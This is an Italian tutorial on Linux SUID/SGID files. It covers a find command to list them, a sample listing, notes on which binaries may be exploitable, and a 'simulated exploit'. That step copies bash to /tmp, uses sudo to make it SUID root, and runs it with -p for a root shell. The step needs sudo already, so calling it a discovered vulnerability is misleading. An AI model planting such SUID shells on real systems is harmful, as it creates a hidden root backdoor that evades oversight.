# SUID/SGID Exploitation

## Introduzione

Approfondiamo il sistema Linux con un deep dive in **SUID/SGID** (Set User ID e Set Group ID). Sono meccanismi che permettono a un eseguibile di girare con i privilegi del proprietario del file, ma non dell'utente che lo esegue.

## Ricognizione del Sistema

Il primo passo è la ricognizione del sistema. Useremo il comando `find` per trovare tutti i binari SUID/SGID nel sistema.

### Comando di Ricerca Completa

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null > /tmp/suid_sgid_full.txt
```

### Breakdown del Comando

- **`/`** - Directory root, cerca ricorsivamente in tutte le sottodirectory
- **`-type f`** - Restringe la ricerca a tutti i file normali (esclude directory, link e dispositivi)
- **`\( -perm -4000 -o -perm -2000 \)`** - Seleziona file con permessi speciali:
  - **`-perm -4000`** - File con SUID
  - **`-perm -2000`** - File con SGID
  - **`-o`** - OR logico (trova uno o l'altro)
  - **`\( \)`** - Parentesi con escape per raggruppare le condizioni
- **`-exec ls -la {}`** - Per ogni file trovato esegue `ls -la`, dove `{}` viene sostituito con il percorso del file
- **`2>/dev/null`** - Reindirizza gli errori (file non leggibili o permessi negati) verso `/dev/null`
- **`> /tmp/suid_sgid_full.txt`** - Salva tutti i risultati validi nel file

## Risultati della Ricerca

```
-rwsr-xr-x 1 root root 47512  8 apr  2024 /usr/bin/crontab
-rwsr-xr-x 1 root root 34944 12 lug  2024 /usr/bin/fusermount
-rwsr-sr-x 1 root root 22560  7 set  2024 /usr/bin/mount.ecryptfs_private
-rws--x--x 1 root root 96664 23 apr 08.13 /usr/bin/mount.nfs
-rwsr-xr-x 1 root root 26744 15 gen  2025 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39016 25 mar 05.53 /usr/bin/fusermount3
-rwsr-sr-x 1 root root 52064 13 giu 17.28 /usr/bin/mount.cifs
-rwsr-xr-x 1 root root 43016 26 giu 19.06 /usr/bin/ksu
-rwsr-sr-x 1 root root 26640 19 giu 10.48 /usr/bin/unix_chkpwd
-rwsr-xr-x 1 root root 64272 27 giu 09.35 /usr/bin/chage
-rwsr-xr-x 1 root root 22800 27 giu 09.35 /usr/bin/expiry
-rwsr-xr-x 1 root root 67696 27 giu 09.35 /usr/bin/gpasswd
-rwxr-s--- 1 root groups 47184 27 giu 09.35 /usr/bin/groupmems
-rwsr-xr-x 1 root root 80856 27 giu 09.35 /usr/bin/passwd
-rwsr-xr-x 1 root root 36264 27 giu 09.35 /usr/bin/sg
-rwsr-xr-x 1 root root 26712 24 giu 12.45 /usr/bin/chfn
-rwsr-xr-x 1 root root 22616 24 giu 12.45 /usr/bin/chsh
-rwsr-xr-x 1 root root 43096 24 giu 12.45 /usr/bin/mount
-rwsr-xr-x 1 root root 18528 24 giu 12.45 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55384 24 giu 12.45 /usr/bin/su
-rwsr-xr-x 1 root root 34912 24 giu 12.45 /usr/bin/umount
-rwxr-sr-x 1 root tty 22616 24 giu 12.45 /usr/bin/wall
-rwxr-sr-x 1 root tty 22616 24 giu 12.45 /usr/bin/write
-rwsr-xr-x 1 root root 257136 30 giu 18.25 /usr/bin/sudo
-rwsr-xr-x 1 root root 18488 15 gen  2025 /usr/lib/polkit-1/polkit-agent-helper-1
---s--x--- 1 root dbus 143576  2 mar 02.56 /usr/lib/dbus-daemon-launch-helper
-r-sr-xr-x 1 root root 14248 23 apr 20.10 /usr/lib/mail-dotlock
-rwsr-xr-x 1 root root 14496  2 lug 20.17 /usr/lib/chromium/chrome-sandbox
-rws--x--x 1 root root 330048  9 apr 18.09 /usr/lib/ssh/ssh-keysign
-rwxr-sr-x 1 root utmp 14352  7 mar 16.31 /usr/lib/utempter/utempter
-rwsr-xr-x 1 root root 14728 22 mar 18.36 /usr/lib/xf86-video-intel-backlight-helper
-rwsr-xr-x 1 root root 145504  3 giu 21.52 /usr/lib/virtualbox/VBoxHeadless
-rwsr-xr-x 1 root root 30912  3 giu 21.52 /usr/lib/virtualbox/VBoxNetAdpCtl
-rwsr-xr-x 1 root root 145504  3 giu 21.52 /usr/lib/virtualbox/VBoxNetDHCP
-rwsr-xr-x 1 root root 145504  3 giu 21.52 /usr/lib/virtualbox/VBoxNetNAT
-rwsr-xr-x 1 root root 145504  3 giu 21.52 /usr/lib/virtualbox/VBoxSDL
-rwsr-xr-x 1 root root 145504  3 giu 21.52 /usr/lib/virtualbox/VirtualBoxVM
-r-sr-xr-x 1 root root 16776 24 giu 20.30 /usr/lib/Xorg.wrap
```

## Analisi dei Permessi

### Breakdown di una Riga Esempio

```
-rwsr-xr-x 1 root root 47512  8 apr  2024 /usr/bin/crontab
```

- **`-rwsr-xr-x`** - Permessi del file, incluso SUID (`s` al posto della `x` del proprietario)
- **`1`** - Numero di hard link
- **`root`** - Proprietario del file
- **`root`** (secondo) - Gruppo del file
- **`47512`** - Dimensione in byte
- **`8 aprile 2024`** - Ultima modifica al file
- **`/usr/bin/crontab`** - Percorso assoluto del file

### Significato dei Permessi Speciali

#### SUID (Set User ID)
- **`s`** nella sezione utente (primi 3 ottali, esempio: `rws`)
- Il file viene eseguito con privilegi del proprietario, ovvero root
- Esempi: `passwd`, `sudo`, `su`, `mount`, `umount`

#### SGID (Set Group ID)
- **`s`** nella sezione del gruppo (esempio: `rwxr-sr-x`)
- Il file viene eseguito con i privilegi del gruppo del file
- Meno usato per i binari ma utile nelle cartelle condivise

## Analisi File Trovati

### File Legittimi Standard
Presenti in ogni sistema Linux:
- `/usr/bin/passwd`
- `/usr/bin/sudo`
- `/usr/bin/su`
- `/usr/bin/chage`

### File Più Rari o Legati a Software Extra

#### `/usr/lib/chromium/chrome-sandbox`
- Chrome usa SUID per isolamento del sandboxing
- Ha SUID perché serve creare un sandbox di sicurezza quando Chromium gira come utente non privilegiato
- **Vulnerabilità**: Nelle vecchie versioni (pre-2016) c'erano race condition e privilege escalation tramite ptrace, clone()
- Alcuni attacchi permettevano di uscire dal sandbox e ottenere root
- L'exploit è difficilissimo oggi, serve una versione vecchia e non patchata

#### Altri File di Interesse
- **`/usr/lib/dbus-daemon-launch-helper`** - Spesso SUID, può essere vulnerabile in vecchie versioni
- **`/usr/lib/xf86-video-intel-backlight-helper`** - Legato a gestione backlight, non comune, da controllare
- **`/usr/lib/virtualbox/VBox*`** - VirtualBox usa SUID per funzioni di rete avanzate, potenziale vettore se vulnerabile
- **`/usr/bin/fusermount`** e **`/usr/bin/fusermount3`** - Montaggio di filesystem utente, potenzialmente sfruttabile se non aggiornato

## Path Inusuali e Sospetti

### Directory Pericolose
Se dal risultato escono path inusuali come `/tmp`, `/var/tmp` sono **molto sospetti** e indicano spesso attività malevole o backdoor.

#### Perché Sono Pericolosi per SUID?
- Sono directory pubbliche e scrivibili da tutti
- Entrambe hanno il bit sticky (`drwxrwxrwt`) che permette a chiunque di scrivere file temporanei
- Un file SUID root qui può essere creato da un malware o da un utente compromesso
- Sono usate per attacchi temporanei perché gli attaccanti spesso lanciano exploit shell loader SUID in `/tmp` o `/var/tmp`
- `/tmp` viene svuotato al reboot di molti sistemi, quindi è volatile - perfetto per attacchi che spariscono dopo un riavvio

## Simulazione Exploit

Andrò a simulare un possibile "exploit" per avere una shell root.

### Step 1: Creazione Shell con SUID

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

### Step 2: Verifica Proprietario

```bash
ls -l /tmp/bash
```

**Output:**
```
-rwsr-sr-x 1 alessandro alessandro 1100536 19 lug 11.59 /tmp/bash
```

Non è root, quindi dobbiamo cambiare proprietario manualmente.

### Step 3: Cambio Proprietario

```bash
sudo chown root:root /tmp/bash
```

### Step 4: Verifica Permessi

```bash
ls -l /tmp/bash
```

**Output:**
```
-rwxr-xr-x 1 root root 1100536 19 lug 11.59 /tmp/bash
```

Il SUID non è attivo, quindi dobbiamo cambiare i permessi:

```bash
sudo chmod u+s /tmp/bash
```

### Step 5: Verifica Finale

```bash
ls -l /tmp/bash
```

**Output:**
```
-rwsr-xr-x 1 root root 1100536 19 lug 11.59 /tmp/bash
```

### Step 6: Esecuzione Exploit

```bash
/tmp/bash -p
```

Dove `-p` sta per "privileged mode" (modalità privilegiata).

**Risultato:**
```bash
bash-5.2# id
uid=1000(alessandro) gid=1000(alessandro) euid=0(root) gruppi=1000(alessandro),3(sys),90(network),98(power),991(lp),998(wheel)
bash-5.2# cd /root
bash-5.2# pwd
/root
bash-5.2# 
```

## Risultato dell'Exploit

✅ **Abbiamo ottenuto una shell root!** L'exploit ha funzionato.

**Osservazioni:**
- UID rimane 1000, ma non importa perché l'**EUID è ciò che conta per i permessi** ed è 0 (root)
- Possiamo accedere a `/root` e altre directory privilegiate
- Abbiamo identificato una possibile vulnerabilità nel sistema tramite SUID e owner root

## Cleanup e Mitigazione

Per mitigare il rischio del sistema, rimuoviamo il file:

```bash
sudo rm -f /tmp/bash
```

## Note di Sicurezza

> ⚠️ **DISCLAIMER**: Questo exploit è stato eseguito in ambiente controllato per scopi educativi. L'utilizzo di queste tecniche su sistemi non autorizzati costituisce reato penale.
